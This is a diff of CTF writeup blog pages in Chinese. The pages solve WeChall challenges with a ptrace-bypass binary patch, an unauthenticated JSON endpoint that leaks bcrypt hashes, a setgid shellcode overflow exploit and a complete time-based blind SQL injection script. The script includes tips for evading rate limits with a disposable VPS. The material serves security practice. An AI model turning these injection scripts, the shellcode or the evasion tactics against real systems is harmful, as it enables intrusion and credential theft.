jne→jmp @ VA 0x08048d87 (1 byte)</span></span><br><span class="line">        f.seek(<span class="number">0x0d87</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\xeb&#x27;</span>)  <span class="comment"># 0x75(jne) → 0xeb(jmp)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 5: call ptrace → xor eax,eax @ VA 0x08048dc0 (5 bytes)</span></span><br><span class="line">        f.seek(<span class="number">0x0dc0</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x31\xc0\x90\x90\x90&#x27;</span>)  <span class="comment"># xor eax,eax; nop; nop; nop</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Patched: <span class="subst">&#123;filepath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    patch(sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>Patch 后运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 patch.py bsd_thelasthope.elf</span><br><span class="line">$ chmod +x bsd_thelasthope.elf</span><br><span class="line">$ ./bsd_thelasthope.elf</span><br><span class="line">User: whoami</span><br><span class="line">Password: PrimeTwins</span><br><span class="line">Correct !! The solution is username_password</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">whoami_PrimeTwins</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-railsbin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-railsbin/" class="post-title-link" itemprop="url">WeChall - Railsbin</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-07-14 14:22:27 / Modified: 14:38:59" itemprop="dateCreated datePublished" datetime="2026-07-14T14:22:27+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-railsbin/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-railsbin/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Railsbin (Exploit) — score 3, by gizmore.</p>
+<p>The project named "railsbin" is open source, but has a few security
+problems. Can you exploit the demo site? The solution is the password
+hash of user solution.</p>
+</blockquote>
+<p>Railsbin 是一个开源 Ruby on Rails pastebin demo。源码在 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpem1vcmUvcmFpbHNiaW4=">gizmore/railsbin<i class="fa fa-external-link-alt"></i></span>。目标是得到用户
+<code>solution</code> 的 bcrypt password hash。</p>
+<h3 id="solution">Solution</h3>
+<p>源码审计发现 <code>UsersController#index</code> 有一个漏洞：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app/controllers/users_controller.rb:8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span></span><br><span class="line">  <span class="variable">@users</span> = <span class="title class_">User</span>.all</span><br><span class="line">  <span class="variable">@users</span>.map &#123;|<span class="params">u</span>| u.password = u.encrypted_password &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>将 <code>encrypted_password</code>（bcrypt hash）复制到虚拟属性
+<code>password</code> 上。JSON view 直接序列化暴露：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app/views/users/index.json.jbuilder</span></span><br><span class="line">json.extract! user, <span class="symbol">:id</span>, <span class="symbol">:name</span>, <span class="symbol">:email</span>, <span class="symbol">:password</span></span><br></pre></td></tr></table></figure>
+<p><strong>无需认证</strong>，直接请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https://railsbin.wechall.net/users.json</span><br></pre></td></tr></table></figure>
+<p>返回所有用户的完整 bcrypt hash，包括 <code>solution</code> 用户：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">17</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solution&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solution@wechall.net&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$2a$10$44GwiA6ai0wxjzhFkeyjuO3kdVvmco8ReypH7H1tLsM2OrRFhe4CK&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">$2a$10$44GwiA6ai0wxjzhFkeyjuO3kdVvmco8ReypH7H1tLsM2OrRFhe4CK</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1564,298 +1906,6 @@ ASLR enabled. libc: glibc 2.35.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Warchall Level 7 — Tropical Fruits exploit.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># Null-free shellcode (42 bytes)</span></span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\x31\xc0\x31\xdb\x31\xc9&quot;</span>              <span class="comment"># xor eax; xor ebx; xor ecx</span></span><br><span class="line">    <span class="string">b&quot;\x66\xbb\xfb\x01\x66\xb9\xfb\x01&quot;</span>      <span class="comment"># mov bx, 0x1fb; mov cx, 0x1fb</span></span><br><span class="line">    <span class="string">b&quot;\xb0\x47\xcd\x80&quot;</span>                      <span class="comment"># mov al, 0x47; int 0x80</span></span><br><span class="line">    <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;</span>      <span class="comment"># xor eax; push eax; push &quot;//sh&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x68\x2f\x62\x69\x6e\x89\xe3&quot;</span>          <span class="comment"># push &quot;/bin&quot;; mov ebx, esp</span></span><br><span class="line">    <span class="string">b&quot;\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;</span>  <span class="comment"># push eax; push ebx; mov ecx, esp; cdq; mov al, 0x0b; int 0x80</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">312</span></span><br><span class="line">CALL_EAX = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x080484cf</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">b&quot;\x90&quot;</span> * (OFFSET - <span class="built_in">len</span>(shellcode)) + CALL_EAX</span><br><span class="line"></span><br><span class="line">subprocess.run(</span><br><span class="line">    [<span class="string">&quot;/home/level/07_tropical_fruits/level07&quot;</span>, payload],</span><br><span class="line">    env=&#123;<span class="string">&quot;PWD&quot;</span>: <span class="string">&quot;/home/level/07_tropical_fruits&quot;</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 <p>执行后交互式 shell 继承 setgid level07，可读 solution.txt。</p>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">LetsGetItOn!</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-blinded-by-the-lighter/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-blinded-by-the-lighter/" class="post-title-link" itemprop="url">WeChall - Blinded by the lighter</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-07-11 18:50:38 / Modified: 19:03:33" itemprop="dateCreated datePublished" datetime="2026-07-11T18:50:38+08:00">2026-07-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-blinded-by-the-lighter/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-blinded-by-the-lighter/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Blinded by the Lighter 是一道 blind SQL injection 题，要求在每轮最多
-33 次查询的硬限制下，连续成功 3 轮提取 32 位 hex hash，且总时间不得超过
-9 分钟。核心思路是用 <code>SLEEP()</code> 的时间侧信道把 16
-个字符映射为不同延迟，每字符仅需 1 次查询。</p>
-<h3 id="challenge">Challenge</h3>
-<ul>
-<li>每轮 <strong>33 次查询</strong>上限</li>
-<li>需<strong>连续成功 3 轮</strong></li>
-<li><strong>9
-分钟</strong>时间限制（<code>BLIGHT2_TIME = 540s</code>）</li>
-<li>字符集 <code>ABCDEF0123456789</code></li>
-<li>无 addslashes/escape，过滤 <code>/*</code> 和
-<code>blight</code></li>
-</ul>
-<h3 id="solution">Solution</h3>
-<h4 id="oracle-php-time">Oracle: PHP Time</h4>
-<p>页面 footer 精确显示服务端执行时间（精度 ~0.02s），利用
-<code>SLEEP()</code> 映射 16 字符为不同时长，1 query/char，32 次刚好卡在
-33 限制内。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;&#x27;=&#x27;&#x27; and (</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span>a<span class="string">&#x27;, sleep(1.2), 1) and</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span>b<span class="string">&#x27;, sleep(2.4), 1) and</span></span><br><span class="line"><span class="string">  ...</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span><span class="number">9</span><span class="string">&#x27;, sleep(19.2), 1)</span></span><br><span class="line"><span class="string">)-- -</span></span><br></pre></td></tr></table></figure>
-<p><code>round(PHP_Time / 1.2)</code> → 字符索引。</p>
-<h4 id="关键细节">关键细节</h4>
-<p><strong>不能轮间 reset</strong> — <code>blightReset(true)</code>
-会清零 consecutive counter。<code>blightSolved()</code>
-成功提交后自动调用 <code>blightReset(false)</code> 生成新 hash
-但保留计数。所以只应在最初 reset 一次。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s.get(URL + <span class="string">&#x27;?reset=me&#x27;</span>)  <span class="comment"># 只此一次</span></span><br><span class="line"><span class="keyword">for</span> rn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">hash</span> = extract()</span><br><span class="line">    s.post(URL, &#123;<span class="string">&#x27;thehash&#x27;</span>: <span class="built_in">hash</span>, <span class="string">&#x27;mybutton&#x27;</span>: <span class="string">&#x27;Enter&#x27;</span>&#125;)</span><br><span class="line">    <span class="comment"># blightSolved() 内部已 reset(false)，无需手动</span></span><br></pre></td></tr></table></figure>
-<p><strong>STEP=1.2</strong> — 比 1.5 快（avg 10.2s vs 12.75s），比 1.0
-可靠（避免 <code>round()</code> 边界误判）。</p>
-<p><strong>requests.Session</strong> — 保持 TLS 连接，overhead
-~0.4s/req。比 curl 子进程快 30%+。</p>
-<p><strong>0.5s 请求间隔</strong> — 避免触发 WeChall 速率限制（~100
-次连续请求后 IP 封禁）。</p>
-<p><strong>Vultr VPS</strong> — 本地网络在代理后 12-15
-次请求即受限，需干净 IP。vc2-1c-1gb ($5/mo) 足够，3 轮结束即销毁。</p>
-<h4 id="实测数据">实测数据</h4>
-<table>
-<thead>
-<tr>
-<th>Round</th>
-<th>Time</th>
-<th>Hash</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>306s</td>
-<td><code>b87c01fcbab910c9f6efb47b58cb57db</code></td>
-</tr>
-<tr>
-<td>2</td>
-<td>396s</td>
-<td><code>ac56aee1f4bbb83845f6beb461cf1b15</code></td>
-</tr>
-<tr>
-<td>3</td>
-<td>457s</td>
-<td><code>6ea2f347f4e3093a0a4c4ec6fd0b1959</code></td>
-</tr>
-</tbody>
-</table>
-<p>总计 306+10+396+10+457 = <strong>1179s</strong>（含 10s
-轮间冷却）。</p>
-<h3 id="脚本">脚本</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;16-level sleep, STEP=1.2, 0.5s delay between requests.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为你的 WeChall session cookie</span></span><br><span class="line">C = &#123;<span class="string">&#x27;WC&#x27;</span>: <span class="string">&#x27;&lt;your_wechall_cookie&gt;&#x27;</span>&#125;</span><br><span class="line">U = <span class="string">&#x27;https://www.wechall.net/challenge/blind_lighter/index.php&#x27;</span></span><br><span class="line">M = <span class="string">&#x27; abcdef0123456789&#x27;</span></span><br><span class="line">S = <span class="number">1.2</span>  <span class="comment"># Faster than 1.5, more reliable than 1.0</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.headers.update(&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;)</span><br><span class="line">s.cookies.update(C)</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, HTTPAdapter(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">d, t=<span class="number">60</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.post(U, data=d, timeout=t, headers=&#123;<span class="string">&#x27;Referer&#x27;</span>: U&#125;).text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url, t=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.get(url, timeout=t).text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pt</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Extract PHP Time value from response body.&quot;&quot;&quot;</span></span><br><span class="line">    m = re.search(<span class="string">r&#x27;PHP Time:\s*([\d.]+)s&#x27;</span>, b)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">float</span>(m.group(<span class="number">1</span>)) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>(<span class="params">pos</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Extract single character at position &lt;pos&gt; using 16-level sleep oracle.&quot;&quot;&quot;</span></span><br><span class="line">    conds = [</span><br><span class="line">        <span class="string">f&quot;if(substr(password,<span class="subst">&#123;pos&#125;</span>,1)=&#x27;<span class="subst">&#123;M[i]&#125;</span>&#x27;, sleep(<span class="subst">&#123;i * S&#125;</span>), 1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>)</span><br><span class="line">    ]</span><br><span class="line">    pl = <span class="string">&quot;&#x27; or &#x27;&#x27;=&#x27;&#x27; and (&quot;</span> + <span class="string">&#x27; and &#x27;</span>.join(conds) + <span class="string">&#x27;)-- -&#x27;</span></span><br><span class="line">    t = pt(post(&#123;<span class="string">&#x27;injection&#x27;</span>: pl, <span class="string">&#x27;inject&#x27;</span>: <span class="string">&#x27;Inject&#x27;</span>&#125;, <span class="number">60</span>))</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    i = <span class="built_in">round</span>(t / S)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt;= i &lt;= <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">return</span> M[i]</span><br><span class="line">    <span class="comment"># Rounding edge case: try ±1</span></span><br><span class="line">    <span class="keyword">for</span> o <span class="keyword">in</span> [-<span class="number">1</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= i + o &lt;= <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> M[i + o]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rd</span>(<span class="params">rn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Run one round: extract 32-char hash and submit.&quot;&quot;&quot;</span></span><br><span class="line">    h = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    t0 = time.time()</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">        h += ex(pos)</span><br><span class="line">        <span class="keyword">if</span> pos % <span class="number">8</span> == <span class="number">0</span> <span class="keyword">or</span> pos == <span class="number">32</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> [<span class="subst">&#123;pos&#125;</span>/32] <span class="subst">&#123;h&#125;</span>  (<span class="subst">&#123;time.time() - t0:<span class="number">.0</span>f&#125;</span>s)&#x27;</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)  <span class="comment"># Rate limit avoidance</span></span><br><span class="line">    t = time.time() - t0</span><br><span class="line">    body = post(&#123;<span class="string">&#x27;thehash&#x27;</span>: h, <span class="string">&#x27;mybutton&#x27;</span>: <span class="string">&#x27;Enter&#x27;</span>&#125;, <span class="number">60</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Your answer is correct&#x27;</span> <span class="keyword">in</span> body:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> SOLVED!(<span class="subst">&#123;t:<span class="number">.0</span>f&#125;</span>s)&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;s&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;Wow&#x27;</span> <span class="keyword">in</span> body:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> OK(<span class="subst">&#123;t:<span class="number">.0</span>f&#125;</span>s)&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;c&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;  R<span class="subst">&#123;rn&#125;</span> BAD(<span class="subst">&#123;t:<span class="number">.0</span>f&#125;</span>s) h=<span class="subst">&#123;h&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get(U + <span class="string">&#x27;?reset=me&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;=== R<span class="subst">&#123;rn&#125;</span> ===&#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    r = rd(rn)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nSOLVED!&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> rn &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;  [cool 10s]&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done.&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-anderson-application-auditing/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-anderson-application-auditing/" class="post-title-link" itemprop="url">WeChall - Anderson Application Auditing (AAA)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-07-08 19:18:57 / Modified: 19:51:56" itemprop="dateCreated datePublished" datetime="2026-07-08T19:18:57+08:00">2026-07-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
